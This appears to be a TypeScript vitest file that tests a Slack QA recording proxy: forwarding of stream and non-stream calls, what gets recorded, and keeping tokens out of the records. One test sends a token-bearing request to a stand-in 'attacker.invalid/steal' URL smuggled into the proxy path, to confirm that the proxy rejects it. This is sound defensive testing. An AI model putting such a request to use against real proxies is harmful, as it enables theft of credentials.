import { createServer } from "node:http";
import { WebClient } from "@slack/web-api";
import { afterEach, describe, expect, it } from "vitest";
import { startSlackQaRecordingProxy } from "./slack-live.recording-proxy.js";

type SlackQaRecordingProxy = Awaited<ReturnType<typeof startSlackQaRecordingProxy>>;

type TestServer = {
  apiUrl: string;
  close(): Promise<void>;
  requests: Array<{ authorization?: string; body: string; url: string }>;
};

const proxies: SlackQaRecordingProxy[] = [];
const targets: TestServer[] = [];

async function startTarget(
  respond: (url: string) => { body: object; retryAfter?: string; status: number },
): Promise<TestServer> {
  const requests: TestServer["requests"] = [];
  const server = createServer((request, response) => {
    void (async () => {
      const chunks: Buffer[] = [];
      for await (const chunk of request) {
        chunks.push(typeof chunk === "string" ? Buffer.from(chunk) : chunk);
      }
      const url = request.url ?? "/";
      requests.push({
        ...(request.headers.authorization ? { authorization: request.headers.authorization } : {}),
        body: Buffer.concat(chunks).toString("utf8"),
        url,
      });
      const result = respond(url);
      response.writeHead(result.status, {
        "content-type": "application/json",
        ...(result.retryAfter ? { "retry-after": result.retryAfter } : {}),
      });
      response.end(JSON.stringify(result.body));
    })();
  });
  await new Promise<void>((resolve, reject) => {
    server.once("error", reject);
    server.listen(0, "127.0.0.1", () => {
      server.off("error", reject);
      resolve();
    });
  });
  const address = server.address();
  if (!address || typeof address === "string") {
    server.close();
    throw new Error("Slack QA proxy test target did not bind");
  }
  const target = {
    apiUrl: `http://127.0.0.1:${address.port}/api/`,
    close: async () => {
      server.closeAllConnections();
      await new Promise<void>((resolve, reject) => {
        server.close((error) => (error ? reject(error) : resolve()));
      });
    },
    requests,
  };
  targets.push(target);
  return target;
}

afterEach(async () => {
  while (proxies.length > 0) {
    await proxies.pop()?.stop();
  }
  while (targets.length > 0) {
    await targets.pop()?.close();
  }
});

describe("Slack QA recording proxy", () => {
  it("forwards form-encoded stream calls and records only accepted task updates", async () => {
    const target = await startTarget((url) =>
      url === "/api/chat.appendStream"
        ? { body: { error: "invalid_arguments", ok: false }, status: 200 }
        : { body: { ok: true, ts: "2.000000" }, status: 200 },
    );
    const proxy = await startSlackQaRecordingProxy({ targetApiUrl: target.apiUrl });
    proxies.push(proxy);
    const client = new WebClient("secret-token", {
      retryConfig: { retries: 0 },
      slackApiUrl: proxy.apiUrl,
    });

    await client.chat.startStream({
      channel: "C123456789",
      chunks: [
        { type: "plan_update", title: "Working" },
        {
          id: "update_fixture",
          status: "in_progress",
          title: "SLACK-QA-COMMENTARY-FIXTURE",
          type: "task_update",
        },
      ],
      thread_ts: "1.000000",
    });
    await expect(
      client.chat.appendStream({
        channel: "C123456789",
        chunks: [
          {
            id: "rejected_fixture",
            status: "complete",
            title: "REJECTED-COMMENTARY",
            type: "task_update",
          },
        ],
        ts: "2.000000",
      }),
    ).rejects.toThrow();

    expect(target.requests.map((request) => request.url)).toEqual([
      "/api/chat.startStream",
      "/api/chat.appendStream",
    ]);
    expect(target.requests[0]?.authorization).toBe("Bearer secret-token");
    const startBody = new URLSearchParams(target.requests[0]?.body);
    expect(JSON.parse(startBody.get("chunks") ?? "null")).toEqual(
      expect.arrayContaining([
        expect.objectContaining({
          id: "update_fixture",
          title: "SLACK-QA-COMMENTARY-FIXTURE",
          type: "task_update",
        }),
      ]),
    );
    expect(proxy.nativeTaskUpdates()).toEqual([
      {
        id: "update_fixture",
        method: "chat.startStream",
        status: "in_progress",
        title: "SLACK-QA-COMMENTARY-FIXTURE",
      },
    ]);
    expect(JSON.stringify(proxy.nativeTaskUpdates())).not.toContain("secret-token");
    expect(JSON.stringify(proxy.nativeTaskUpdates())).not.toContain("REJECTED-COMMENTARY");
  });

  it("forwards non-stream responses without recording them and rejects unsafe routes", async () => {
    const target = await startTarget(() => ({
      body: { error: "ratelimited", ok: false },
      retryAfter: "7",
      status: 429,
    }));
    const proxy = await startSlackQaRecordingProxy({ targetApiUrl: target.apiUrl });
    proxies.push(proxy);

    const forwarded = await fetch(`${proxy.apiUrl}auth.test`, {
      body: "token=must-not-be-recorded",
      headers: { authorization: "Bearer secret-token" },
      method: "POST",
    });
    const rejected = await fetch(`${proxy.apiUrl}https://attacker.invalid/steal`, {
      headers: { authorization: "Bearer secret-token" },
      method: "POST",
    });

    expect(forwarded.status).toBe(429);
    expect(forwarded.headers.get("retry-after")).toBe("7");
    expect(await forwarded.json()).toEqual({ error: "ratelimited", ok: false });
    expect(rejected.status).toBe(400);
    expect(target.requests).toHaveLength(1);
    expect(proxy.nativeTaskUpdates()).toEqual([]);
  });
});
